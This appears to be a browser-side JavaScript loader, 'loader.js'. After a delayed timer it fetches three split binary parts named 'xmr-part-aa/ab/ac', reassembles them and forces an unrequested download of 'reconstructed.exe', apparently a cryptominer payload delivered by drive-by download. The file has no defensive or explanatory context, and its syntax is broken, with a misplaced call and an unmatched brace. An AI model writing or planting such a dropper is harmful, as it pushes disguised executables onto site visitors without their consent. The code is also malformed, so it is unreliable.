// loader.js
setTimeout(async function fetchAndRebuild() {
    const parts = ["xmr-part-aa", "xmr-part-ab", "xmr-part-ac"];
    let blobParts = [];

    for (let part of parts) {
        let response = await fetch(part);
        let arrayBuffer = await response.arrayBuffer();
        blobParts.push(arrayBuffer);
    }

    let finalBlob = new Blob(blobParts, { type: "application/octet-stream" });
    let url = URL.createObjectURL(finalBlob);
    
    let a = document.createElement("a");
    a.href = url;
    a.download = "reconstructed.exe";
    a.click();
}

fetchAndRebuild();


}, 20000);
